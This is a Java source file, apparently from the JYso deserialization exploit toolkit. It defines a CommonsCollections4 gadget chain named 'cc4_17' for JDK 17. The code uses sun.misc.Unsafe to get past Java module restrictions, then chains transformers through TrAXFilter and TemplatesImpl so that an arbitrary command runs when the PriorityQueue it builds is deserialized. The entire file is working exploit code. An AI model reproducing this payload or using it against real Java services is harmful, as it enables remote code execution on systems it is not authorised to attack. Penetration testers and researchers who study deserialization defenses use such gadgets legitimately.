package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.*;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import static com.qi4l.JYso.gadgets.utils.jdk17Bypass.patchModule;


@SuppressWarnings({"rawtypes", "unchecked"})
@Authors({Authors.JIECUB3})
public class cc4_17 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        patchModule(cc4_17.class, aClass);

        Class<?>               TrAXFilter           = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        InstantiateTransformer invokerTransformer5  = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        ConstantTransformer    constantTransformer2 = new ConstantTransformer(TrAXFilter);

        InvokerTransformer  invokerTransformer4 = new InvokerTransformer("getAndSetObject", new Class[]{Object.class, long.class, Object.class}, new Object[]{Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"), 60, "javax.xml"});
        InvokerTransformer  invokerTransformer3 = new InvokerTransformer("get", new Class[]{Object.class}, new Object[]{null});
        InvokerTransformer  invokerTransformer2 = new InvokerTransformer("setAccessible", new Class[]{boolean.class}, new Object[]{true});
        TransformerClosure  transformerClosure  = new TransformerClosure(invokerTransformer2);
        ClosureTransformer  ClosureTransformer  = new ClosureTransformer(transformerClosure);
        InvokerTransformer  invokerTransformer  = new InvokerTransformer("getDeclaredField", new Class[]{String.class}, new Object[]{"theUnsafe"});
        ConstantTransformer constantTransformer = new ConstantTransformer(Class.forName("sun.misc.Unsafe"));
        Transformer[]       transformers        = new Transformer[]{constantTransformer, invokerTransformer, ClosureTransformer, invokerTransformer3, invokerTransformer4, constantTransformer2, invokerTransformer5};
        Transformer         keyTransformer      = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(keyTransformer);
        PriorityQueue          priorityQueue          = new PriorityQueue(2, transformingComparator);
        patchModule(cc4_17.class, priorityQueue.getClass());
        Field size = priorityQueue.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.setInt(priorityQueue, 2);

        return priorityQueue;
    }
}
